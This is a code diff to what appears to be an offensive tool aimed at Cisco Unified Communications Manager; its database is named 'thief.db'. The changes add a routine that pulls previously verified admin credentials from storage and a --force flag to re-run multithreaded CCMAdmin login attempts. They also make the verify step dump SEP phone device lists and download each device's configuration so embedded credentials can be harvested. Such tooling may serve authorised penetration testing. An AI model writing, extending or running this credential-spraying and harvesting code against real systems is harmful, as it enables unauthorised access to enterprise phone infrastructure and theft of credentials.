@@ -1086,6 +1086,38 @@ def is_already_verified(cucm_host, username, password, db_file='thief.db'):
         return False
 
 
+def get_valid_admin_logins(db_file, hosts=None):
+    """
+    Return {cucm_host: (username, password)} for each host that has a 'valid'
+    verification_attempts row, using that host's most recently verified valid
+    pair. If `hosts` is given, restrict the result to those hosts. Returns an
+    empty dict on error (table missing / unreadable).
+
+    Lets --verify dump devices and chase configs for hosts proven valid in an
+    earlier run, not just ones verified in the current run.
+    """
+    try:
+        conn = sqlite3.connect(db_file, timeout=30.0)
+        rows = conn.execute('''
+            SELECT cucm_host, username, password FROM verification_attempts
+             WHERE result = 'valid'
+             ORDER BY attempt_time ASC, id ASC
+        ''').fetchall()
+        conn.close()
+    except Exception as e:
+        if globals().get('debug', False):
+            print(f'[!] get_valid_admin_logins error: {e}')
+        return {}
+
+    allow = set(hosts) if hosts is not None else None
+    logins = {}
+    for host, username, password in rows:
+        if allow is not None and host not in allow:
+            continue
+        logins[host] = (username, password)  # later (more recent) rows overwrite
+    return logins
+
+
 def get_distinct_credential_pairs(db_file='thief.db'):
     """
     Return a list of distinct (username, password) tuples from the credentials
@@ -1832,21 +1864,25 @@ def _verify_worker(work_queue, results, port, db_file, timeout=10, _login_fn=Non
 
 
 def run_verify(hosts, pairs, port, threads, db_file, dump_devices=True,
-               use_tftp=True, download_threads=10, _dump_fn=None, _download_fn=None):
+               use_tftp=True, download_threads=10, force=False,
+               _dump_fn=None, _download_fn=None):
     """
     Top-level orchestrator for --verify.
 
     Builds the cross-product hosts × pairs into (cucm_host, username, password)
-    tuples, skips combinations already definitively verified, runs a worker pool
-    of CCMAdmin login attempts, and logs every attempt to verification_attempts.
+    tuples, skips combinations already definitively verified (unless `force`),
+    runs a worker pool of CCMAdmin login attempts, and logs every attempt to
+    verification_attempts.
 
-    When dump_devices is True, every host that produced a valid admin login this
-    run then has its full SEP device list pulled from the admin interface (AXL,
-    falling back to a CCMAdmin scrape) and persisted to admin_devices — once per
-    host, using the first valid credential pair found for it.
+    When dump_devices is True, every host with a valid admin login — whether
+    verified in this run or an earlier one (seeded from the DB) — then has its
+    full SEP device list pulled from the admin interface (AXL, falling back to a
+    CCMAdmin scrape), persisted to admin_devices, and each device's config
+    downloaded and mined for credentials. This means a re-run still harvests
+    devices/configs for known-valid hosts rather than doing nothing.
 
     Returns the results dict (valid/invalid/error/skipped counts) or None under
-    _TEST_MODE. _dump_fn is injectable for testing (default: dump_admin_devices).
+    _TEST_MODE. _dump_fn / _download_fn are injectable for testing.
     """
     if _TEST_MODE:
         return None
@@ -1863,7 +1899,7 @@ def run_verify(hosts, pairs, port, threads, db_file, dump_devices=True,
     queued = 0
     for host in hosts:
         for username, password in pairs:
-            if is_already_verified(host, username, password, db_file):
+            if not force and is_already_verified(host, username, password, db_file):
                 skipped += 1
             else:
                 work.put((host, username, password))
@@ -1874,42 +1910,46 @@ def run_verify(hosts, pairs, port, threads, db_file, dump_devices=True,
 
     results = {'valid': 0, 'invalid': 0, 'error': 0, 'skipped': skipped,
                'valid_logins': {}, 'lock': threading.Lock()}
-    if queued == 0:
-        print('[+] Nothing to do; all combinations already verified.')
-        return results
 
-    worker_threads = []
-    for _ in range(max(1, min(threads, queued))):
-        t = threading.Thread(
-            target=_verify_worker,
-            args=(work, results, port, db_file),
-            daemon=True,
-        )
-        t.start()
-        worker_threads.append(t)
-    for t in worker_threads:
-        t.join()
+    if queued:
+        worker_threads = []
+        for _ in range(max(1, min(threads, queued))):
+            t = threading.Thread(
+                target=_verify_worker,
+                args=(work, results, port, db_file),
+                daemon=True,
+            )
+            t.start()
+            worker_threads.append(t)
+        for t in worker_threads:
+            t.join()
+        print(f'[+] Verification complete: valid={results["valid"]} '
+              f'invalid={results["invalid"]} error={results["error"]} skipped={skipped}')
+    else:
+        print('[+] No new credential pairs to verify (use --force to re-check).')
 
-    print(f'[+] Verification complete: valid={results["valid"]} '
-          f'invalid={results["invalid"]} error={results["error"]} skipped={skipped}')
-
-    valid_logins = results.get('valid_logins', {})
-    if dump_devices and valid_logins:
+    # Dump devices + chase configs for every host with valid admin access, seeded
+    # from the DB so hosts verified in an earlier run are included too.
+    if dump_devices:
         if _dump_fn is None:
             _dump_fn = dump_admin_devices
         if _download_fn is None:
             _download_fn = download_uds_discovered_configs
-        print(f'[+] Dumping SEP device lists from {len(valid_logins)} host(s) with valid admin access...')
-        for host, (username, password) in valid_logins.items():
-            device_names = _dump_fn(host, port, username, password, db_file)
-            # Exact device names from the admin side -> fetch each SEP config
-            # directly (no MAC brute force) and harvest any embedded credentials.
-            if device_names:
-                print(f'[+] {host}: downloading {len(device_names)} device config(s)...')
-                hits = _download_fn(host, device_names, db_file, use_tftp=use_tftp,
-                                    threads=download_threads)
-                print(f'[+] {host}: config download complete, '
-                      f'{hits}/{len(device_names)} config(s) yielded credentials')
+        valid_logins = get_valid_admin_logins(db_file, hosts)
+        if valid_logins:
+            print(f'[+] Dumping SEP device lists from {len(valid_logins)} host(s) with valid admin access...')
+            for host, (username, password) in valid_logins.items():
+                device_names = _dump_fn(host, port, username, password, db_file)
+                # Exact device names from the admin side -> fetch each SEP config
+                # directly (no MAC brute force) and harvest embedded credentials.
+                if device_names:
+                    print(f'[+] {host}: downloading {len(device_names)} device config(s)...')
+                    hits = _download_fn(host, device_names, db_file, use_tftp=use_tftp,
+                                        threads=download_threads)
+                    print(f'[+] {host}: config download complete, '
+                          f'{hits}/{len(device_names)} config(s) yielded credentials')
+        else:
+            print('[-] No hosts with valid admin credentials; nothing to dump.')
 
     return results
 
@@ -3356,6 +3396,7 @@ def main():
             dump_devices=not args.no_device_dump,
             use_tftp=use_tftp,
             download_threads=args.verify_threads,
+            force=args.force,
         )
         quit(0)
 
